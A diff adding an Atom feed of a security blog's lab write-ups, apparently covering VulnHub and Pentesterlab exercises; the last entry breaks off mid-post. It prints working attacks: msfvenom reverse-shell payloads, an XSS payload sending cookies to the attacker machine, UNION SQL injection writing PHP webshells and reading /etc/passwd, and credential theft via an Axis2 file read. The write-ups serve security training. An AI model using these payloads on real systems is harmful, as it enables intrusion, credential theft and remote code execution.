@@ -1,0 +1,2692 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-04-27T15:40:42-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[SecTalks: BNE0x00 - Minotaur]]></title>
+    <link href="http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur/"/>
+    <updated>2016-04-26T13:27:14-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur</id>
+    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/">Vulhub</a></p>
+
+<h3>Forces:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>Metasploit</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.56.223 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.56.223 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 22, 80 and 2020 is opening.</p>
+
+<p>use wfuzz to find more locations</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.223/FUZZ 2&gt;/dev/null</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>found <a href="http://192.168.56.223/bull/">http://192.168.56.223/bull/</a></p>
+
+<p>Check the page, it looks like use wordpress. good. maybe I can find out some old wordpress plugins.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I use wpscan to find wordpress plugins vulnerabilities.</p>
+
+<p><code>uby wpscan.rb --url http://192.168.56.223/bull/</code></p>
+
+<p>get some xss vulnerabilities and an interestig arbutrart file upload vulnerability.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[TestLab--V.8]]></title>
+    <link href="http://wg135.github.io/blog/2016/04/25/testlab-v-dot-8/"/>
+    <updated>2016-04-25T13:13:31-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/04/25/testlab-v-dot-8</id>
+    <content type="html"><![CDATA[<p><em>Night is falling</em> &mdash;- Lord of the rings</p>
+
+<!--more-->
+
+
+<p>Network diagram, from <a href="https://lab.pentestit.ru/pentestlabs/4">pentestit</a></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentestit/v8/TL8_map.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>Forces:</h3>
+
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>Metasploit</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SecTalks: BNE0x03 - Simple]]></title>
+    <link href="http://wg135.github.io/blog/2016/04/20/sectalks-bne0x03-simple/"/>
+    <updated>2016-04-20T13:49:22-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/04/20/sectalks-bne0x03-simple</id>
+    <content type="html"><![CDATA[<p><em>May the LORD, my rock, be praised, who trains my hands for battle and my fingers for warfare.</em> &mdash;- Psalm 144:1</p>
+
+<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">Vulhub</a></p>
+
+<p>Simple CTF is a boot2root that focuses on the basics of web based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don&rsquo;t have physical access to this machine. Therefore, tricks like editing the VM&rsquo;s BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal.</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>Metasploit</li>
+</ul>
+
+
+<h3>Detail Assessment and Planning</h3>
+
+<ul>
+<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
+<li>Search the web app vulnerability  &mdash; searchsploit</li>
+<li>Generate and upload webshell  &mdash;metasploit</li>
+<li>Get root</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.172 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.172 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only port 80 is opening. Lets use Iceweasel to view the page.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I noticed that the web app is Cutenews 2.0.3. search the exploit:</p>
+
+<p><code>searchsploit cutenews</code></p>
+
+<p>find the interesting results:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The exploit is as follow:</p>
+
+<ul>
+<li>Sign up for New User</li>
+<li>Log In</li>
+<li>Go to Personal options <a href="http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal">http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal</a></li>
+<li>Select Upload Avatar Example: Evil.jpg</li>
+<li>use tamper data  &amp; Rename File Evil.jpg to Evil.php</li>
+</ul>
+
+
+<p>Okay, firstly, I creat a reverse php shell,</p>
+
+<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.156 LPORT=1234 -a php --platform php -o evil.jpg</code></p>
+
+<p>Now, use Burp as proxy, go to Personal options <a href="http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal">http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal</a> to upload evil.jpg</p>
+
+<p>in the burp, change the evil.jgp to evil.php</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>After that, Burp will recevied a GET request:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>set metasploit multi/handler.</p>
+
+<p>now go to <a href="http://192.168.79.172/uploads/avatar_bob1bob2.php">http://192.168.79.172/uploads/avatar_bob1bob2.php</a> will get meterpreter reverse shell:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>However, I am not the root, search the os version:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>search the ubuntu 14.04</p>
+
+<p><code>searchsploit ubuntu 14.04</code> and we get the result:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Move the file to /var/www/html/ and in reverse shell:</p>
+
+<p><code>wget http://192.168.79.156/37292.c -O hack.c</code></p>
+
+<p>compile it:</p>
+
+<p><code>gcc hack.c -o hack -static</code>, run it.</p>
+
+<p>then use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> to get the shell.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/last.jpg" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CVE-2008-1930 Wordpress 2.5 Cookie Integrity Protection Vulnerability]]></title>
+    <link href="http://wg135.github.io/blog/2016/04/18/cve-2008-1930/"/>
+    <updated>2016-04-18T16:53:35-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/04/18/cve-2008-1930</id>
+    <content type="html"><![CDATA[<p><em>Wake up..Neo.. The Matrix HAS YOU</em> &mdash;&ndash;the Matrix</p>
+
+<p>From <a href="https://pentesterlab.com/exercises/cve-2008-1930/course">pentesterlab</a>
+This course details the exploitation of an issue in the cookies integrity mechanism of Wordpress. This issue was found in 2008 and allowed an attacker to gain administrator access to a wordpress instance if user registration is enabled.</p>
+
+<p>Difficluty: 2/5</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>Cookie Manager+</li>
+<li>wfuzz</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Use wfuzz to burte force hidden path of the server</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next step, we use admin1 and password pentesterlab to login as user admin1</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>here we can use Cookie Manager+ to view the cookies we got.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>modify cookie from <code>admin1%7C1461188835%7Ce6cf864114aa5acaae0795ff56b333b0</code> to <code>admin%7C11461188835%7Ce6cf864114aa5acaae0795ff56b333b0</code>, reload the page, now we are in admin&rsquo;s session.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--Xss and MySQL FILE]]></title>
+    <link href="http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file/"/>
+    <updated>2016-04-12T13:19:35-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file</id>
+    <content type="html"><![CDATA[<p><em>It is time for you to act, LORD; your law is being broken.</em> &mdash; Psalm 119:126</p>
+
+<p>This course details the exploitation of a Cross-Site Scripting in a PHP based website and how an attacker can use it to gain access to the administration pages. Then, using this access, the attacker will be able to gain code execution on the server using SQL injections.</p>
+
+<p>From Pentesterlab:</p>
+
+<p>The attack is divided into 2 steps:</p>
+
+<ol>
+<li>Detection and exploitation of Cross-Site Scripting vulnerabilities: in this part, you will learn how to detect and exploit Cross-Site Scripting vulnerabilities.</li>
+<li>Access to the administration pages, then find and exploit a SQL injection to gain code execution. The last step in which you will access the operating system and run command.</li>
+</ol>
+
+
+<p>Difficluty: 2/5</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>Nmap</li>
+<li>wfuzz</li>
+<li>Zap</li>
+<li>Firebug</li>
+<li>Cookie Manager+</li>
+</ul>
+
+
+<h3>Detail Assessment and Planning</h3>
+
+<ul>
+<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
+<li>Burte force hidden path of the server. &mdash;-wfuzz</li>
+<li>Indetify XSS vuln and scan the website pages. &mdash;-Zap</li>
+<li>Embeded script into page. &mdash;- Firebug</li>
+<li>Deploy web shell.</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>
+
+<p><code>nmap -sV -v -A 192.168.79.168</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Use wfuzz to burte force hidden path of the server</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Also I lauched zap to scan the website, try to find interesting things such as injection points and hidden pages. two things are very interesting. First of all, zap raises a flag for a xss vulnerability:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>it looks like zap has already inject <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> into that page. If you visit the link &ldquo;<a href="http://192.168.79.168/post.php?id=1">http://192.168.79.168/post.php?id=1</a>&rdquo;, it will pop up an alert 1.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>We can use this xss vulnerability to steal admin&rsquo;s cookie.</p>
+
+<p>keep going &hellip;</p>
+
+<p>Before stealing admin&rsquo;s cookie, we have to setup listener on attacking machine,</p>
+
+<p><code>python -m SimpleHTTPServer 4444</code></p>
+
+<p>use this payload instead of alert(1) in the xss (use firebug to edit the html)</p>
+
+<p><code>&lt;script&gt;document.write('&lt;img src="http://192.168.79.156:4444/?'+document.cookie+'  "/&gt;');&lt;/script&gt;</code></p>
+
+<p>192.168.79.156 is attacker&rsquo;s machine.</p>
+
+<p>Now we got the cookie.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>put the cookie in Cookie Manager+</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now visit <code>http://192.168.79.168/admin/</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Let&rsquo;s explore the admin&rsquo;s pages. First, click <code>edit</code>, it will go to <code>http://192.168.79.168/admin/edit.php?id=2</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now looks like the url contains injection point, lets try to use single quote:</p>
+
+<p><code>http://192.168.79.168/admin/edit.php?id=2'</code></p>
+
+<p>we get error message:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now we know that the web sites' absolute path is &ldquo;/var/www/&rdquo;</p>
+
+<p>From <a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course">pentesterlab</a></p>
+
+<p>Exploiting SQL injection using UNION follows the steps below:</p>
+
+<p> 1   Find the number of columns to perform the UNION
+ 2   Find what columns are echoed in the page
+ 3   Retrieve information from the database meta-tables
+ 4   Retrieve information from other tables/databases</p>
+
+<p>In order to perform a request by SQL injection, you need to find the number of columns that are returned by the first part of the query. Unless you have the source code of the application, you will have to guess this number.</p>
+
+<p>There are two methods to get this information:</p>
+
+<p>1   using UNION SELECT and increase the number of columns;
+2   using ORDER BY statement.</p>
+
+<p>Here we use order by statement to get the number of columns</p>
+
+<p><code>http://192.168.79.168/admin/edit.php?id=2 order by 4 --</code> good
+<code>http://192.168.79.168/admin/edit.php?id=2 order by 5 --</code> error</p>
+
+<p>Now that we know the number of columns, we can retrieve information from the database. Based on the error message we received, we know that the backend database used is MySQL.</p>
+
+<p>get DB version:</p>
+
+<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,@@version,4</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get /etc/passwd file:</p>
+
+<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,load_file("/etc/passwd"),4</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get user info:</p>
+
+<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,user(),4</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>since the user is root, now we can deploy a webshell&hellip;</p>
+
+<p>use <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> to create evil.php under css folder. Encode <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> part.</p>
+
+<p>Now we can see that the evil.php is created successfully.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Cool&hellip; Lets write webshell now</p>
+
+<p><code>http://192.168.79.168/admin/edit.php?id=0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>
+
+<p>of course. encode <code>0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>
+
+<p>Now run command:</p>
+
+<p><code>http://192.168.79.168/css/webshell.php?c=cat /etc/passwd</code></p>
+
+<p>encode <code>/etc/passwd</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/tumblr_nqnzzzQJGq1rbc9h1o1_500.gif" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--Axis2 Web service and Tomcat Manager ]]></title>
+    <link href="http://wg135.github.io/blog/2016/04/05/pentesterlab/"/>
+    <updated>2016-04-05T14:46:46-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/04/05/pentesterlab</id>
+    <content type="html"><![CDATA[<p><em>When you engage in actual fighting, if victory is long in coming, then men&rsquo;s weapons will grow dull and their ardor will be damped. If you lay siege to a town, you will exhaust your strength.</em> &mdash;&ndash; The Art of War</p>
+
+<p>This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users' file to access the Tomcat Manager and gain commands execution on the server. &mdash;Pentesterlab</p>
+
+<p>Difficluty: 3/5</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>Nmap</li>
+<li>wfuzz</li>
+<li>nc</li>
+<li>msfvenom</li>
+</ul>
+
+
+<h3>Detail Assessment and Planning</h3>
+
+<ul>
+<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
+<li>Burte force hidden path of the server. &mdash;-wfuzz</li>
+<li>generate webshell. &mdash;msfvenom</li>
+<li>backdoor. &mdash;nc</li>
+<li>webshell. &mdash;Car.arr</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>
+
+<p><code>nmap -sV -v -A 192.168.79.168</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Use wfuzz to burte force hidden path of the server</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now we find that the server host a web service using Axis2.</p>
+
+<p>In order to test is the web server using Tomcat, we can try to visit a non-existing web page and watch the 404 error page.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now we find the server uses Tomcat and we get the version of the Tomcat. Keep going&hellip;</p>
+
+<p>Lets check the path axis2/ , we get the page:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the list of the available services by visiting the page <code>http://192.168.79.168/axis2/services/listServices</code> or click the serices link</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The WSDL information can be accessed by clicking the service&rsquo;s name in the listServices page or directly using the following URL: <code>http://192.168.79.168/axis2/services/ProxyService?wsdl</code>.</p>
+
+<p>We can see that <code>get</code> operation is defined in WSDL</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Axis2 provides an easy way to call Web services, you just need to follow the pattern <a href="http://">http://</a>[WS_URL]/method?parameters</p>
+
+<h4>Attack</h4>
+
+<h4>Easy way</h4>
+
+<p>Get Tomcat manager configuration to get login credentials.
+In Debian Linux, the tomcat configuration file tomcat-users.xml has default location: /etc/tomcat6/tomcat-users.xml</p>
+
+<p>So we can try:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.79.168/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then we get the Tomcat manager&rsquo;s credentials:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>the tomcat manager-gui login password can be found: username: manager password: !mp0ss!bl32gu355</p>
+
+<p>Then login tomcat manager from the URL <a href="http://192.168.79.168/manager/html">http://192.168.79.168/manager/html</a> to upload and deploy JSP webshell in WAR file.</p>
+
+<h4>deploy webshell</h4>
+
+<p>Generate webshell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir webshell
+</span><span class='line'>$ cd webshell
+</span><span class='line'>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.156 LPORT=4444 -f raw &gt; sh4.jsp
+</span><span class='line'>$ jar -cvf ../webshell.war *
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then uplpad the websehll.war to manager page</p>
+
+<p>in Kali setup nc:</p>
+
+<p><code>nc -nlvp 4444</code></p>
+
+<p>go to <code>http://192.168.79.168/webshell/sh4.jsp</code></p>
+
+<p>then you will get the shell:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<h4>&lsquo;Hard&rsquo; way</h4>
+
+<p>In Debian Linux, the axis2 configuration file axis2.xml has default location: <code>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</code></p>
+
+<p>so we can visit this page by using,</p>
+
+<p><code>http://192.168.79.168/axis2/services/ProxyService/get?uri=file:///var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</code></p>
+
+<p>from axis2.xml, we find the credential is admin/axis2</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Then login axis2 admin page from the URL <code>http://192.168.79.168/axis2/axis2-admin/</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>then try to upload webshell.war we used in last method.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like it doesn&rsquo;t support the war file format. WTF, okay, try harder.</p>
+
+<p>After google search, I found a webshell for axis2,  called <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">Cat.arr</a></p>
+
+<p>Download it and upload it to the server, it requres host IP and port number:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.79.168/axis2/services/Cat/shell?host=192.168.79.156&port=6666</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Oh&hellip;..</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/gameover.jpeg" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--cve-2007-1860]]></title>
+    <link href="http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860/"/>
+    <updated>2016-04-05T12:04:47-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860</id>
+    <content type="html"><![CDATA[<p><em>By means of these seven considerations I can forecast victory or defeat.</em> &mdash;&ndash; The Art of War</p>
+
+<p>This course details the exploitation of a vulnerability in mod_jk and how by using this issue it is possible to access the administration interface of a Tomcat server (Tomcat&rsquo;s manager). Then using this access, we will see how an attacker can use default credentials to log in as administrator and use this access to gain code execution on the server. &mdash;Pentesterlab</p>
+
+<p>Difficluty: 2/5</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>Nmap</li>
+<li>NC</li>
+<li>Firebug</li>
+<li>webshell</li>
+</ul>
+
+
+<h3>Detail Assessment and Planning</h3>
+
+<ul>
+<li>Port scan to identify opened ports, running services and services version. &mdash;&ndash; Nmap</li>
+<li>Check http headers. &mdash;&ndash; NC</li>
+<li>Exploit and upload webshell. &mdash;- Firebug</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>By checking the application HTTP headers with nc, I can also get Apache service version.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
+</span><span class='line'>Host: 192.168.79.168</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<h4>Attack</h4>
+
+<p>First of all, we need to figure out the architecture of Tomcat and Apache. Read <a href="https://pentesterlab.com/exercises/cve-2007-1860/course">here</a></p>
+
+<p>If we try to visit a non-exist page, we will receive 404 error like that:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Based on the result, we know the http request is processed by Apache.</p>
+
+<p>If we try to visit page like 192.168.79.168/examples/jsp/test404, we will get the 404 error like:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Then we know that the http request is processed by Tomcat through Apache.</p>
+
+<p>Tomcat Manager is available at the following URI: /manager/html and is, most of the time, protected by a password. The CVE-2007-1860 vulnerability is described <a href="http://mail-archives.apache.org/mod_mbox/tomcat-dev/200706.mbox/%3C4667755F.6070700@apache.org%3E">advisory</a></p>
+
+<p>From pentesterlab,</p>
+
